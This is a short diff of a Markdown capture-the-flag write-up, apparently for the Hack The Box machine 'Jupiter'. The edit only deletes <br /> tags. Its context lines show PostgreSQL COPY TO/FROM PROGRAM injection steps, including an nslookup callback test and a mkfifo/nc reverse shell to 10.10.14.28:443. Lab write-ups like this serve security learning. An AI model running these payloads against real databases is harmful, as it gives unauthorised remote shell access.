@@ -255,8 +255,6 @@ To do it we only need to send three `requests`.
 COPY (SELECT '') to PROGRAM 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
 ```
 
-<br />
-
 ![9](../../../assets/images/Jupiter/9.png)
 
 <br />
@@ -269,8 +267,6 @@ COPY (SELECT '') to PROGRAM 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
 CREATE TABLE shell(output text);
 ```
 
-<br />
-
 ![10](../../../assets/images/Jupiter/10.png)
 
 <br />
@@ -282,8 +278,6 @@ CREATE TABLE shell(output text);
 ```sql 
 COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.28 443 >/tmp/f';
 ```
-
-<br />
 
 ![11](../../../assets/images/Jupiter/11.png)
 
